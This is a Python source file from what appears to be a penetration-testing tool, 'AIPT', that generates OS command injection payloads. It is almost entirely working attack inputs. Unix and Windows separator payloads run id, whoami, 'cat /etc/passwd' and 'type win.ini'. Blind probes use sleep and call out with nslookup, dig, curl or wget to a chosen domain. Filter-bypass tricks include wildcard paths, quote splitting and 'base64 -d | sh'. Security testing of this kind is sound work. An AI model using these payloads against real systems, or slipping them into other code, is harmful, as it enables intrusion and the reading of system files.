"""
AIPT Command Injection Payloads

OS command injection payloads for security testing.
"""
from __future__ import annotations

from typing import Iterator


class CommandInjectionPayloads:
    """
    Command injection payload generator.

    Categories:
    - Unix: Linux/Mac command injection
    - Windows: Windows command injection
    - Blind: Out-of-band detection
    - Filter bypass: Evasion techniques

    Example:
        cmdi = CommandInjectionPayloads()
        for payload in cmdi.unix():
            test(payload)
    """

    @classmethod
    def unix(cls) -> Iterator[str]:
        """Unix/Linux command injection payloads"""
        commands = ["id", "whoami", "uname -a", "cat /etc/passwd"]

        for cmd in commands:
            payloads = [
                # Command separators
                f"; {cmd}",
                f"| {cmd}",
                f"|| {cmd}",
                f"& {cmd}",
                f"&& {cmd}",
                f"`{cmd}`",
                f"$({cmd})",

                # Newline
                f"\n{cmd}",
                f"\r\n{cmd}",

                # With quotes
                f"'; {cmd}; '",
                f'"; {cmd}; "',

                # Null byte
                f"%00{cmd}",
            ]
            yield from payloads

    @classmethod
    def windows(cls) -> Iterator[str]:
        """Windows command injection payloads"""
        commands = ["whoami", "dir", "ipconfig", "type C:\\Windows\\win.ini"]

        for cmd in commands:
            payloads = [
                f"& {cmd}",
                f"&& {cmd}",
                f"| {cmd}",
                f"|| {cmd}",
                f"\r\n{cmd}",
                f"'; {cmd}; '",
            ]
            yield from payloads

    @classmethod
    def blind_time(cls) -> Iterator[str]:
        """Time-based blind detection"""
        payloads = [
            # Unix sleep
            "; sleep 5",
            "| sleep 5",
            "& sleep 5",
            "`sleep 5`",
            "$(sleep 5)",
            "'; sleep 5; '",

            # Windows timeout
            "& timeout 5",
            "& ping -n 5 127.0.0.1",
        ]
        yield from payloads

    @classmethod
    def blind_dns(cls, domain: str) -> Iterator[str]:
        """DNS-based out-of-band detection"""
        payloads = [
            f"; nslookup {domain}",
            f"| nslookup {domain}",
            f"`nslookup {domain}`",
            f"$(nslookup {domain})",
            f"; dig {domain}",
            f"; host {domain}",
            f"; curl {domain}",
            f"; wget {domain}",
        ]
        yield from payloads

    @classmethod
    def filter_bypass(cls) -> Iterator[str]:
        """Filter bypass techniques"""
        payloads = [
            # Using wildcards
            "/b?n/c?t /etc/passwd",
            "/b??/cat /etc/passwd",
            "/???/c?t /etc/passwd",

            # Using environment variables
            "$HOME",
            "${HOME}",

            # Hex encoding
            "$'\\x69\\x64'",  # id

            # Using quotes
            "i'd'",
            'i"d"',
            "wh''oami",
            'wh""oami',

            # Using backslash
            "wh\\oami",
            "c\\at /etc/passwd",

            # Using $@
            "wh$@oami",
            "c$@at /etc/passwd",

            # Base64
            "echo aWQ= | base64 -d | sh",

            # Variable concatenation
            "a=who;b=ami;$a$b",
            "a=c;b=at;$a$b /etc/passwd",
        ]
        yield from payloads

    @classmethod
    def all(cls) -> Iterator[str]:
        """All command injection payloads"""
        yield from cls.unix()
        yield from cls.windows()
        yield from cls.blind_time()
        yield from cls.filter_bypass()
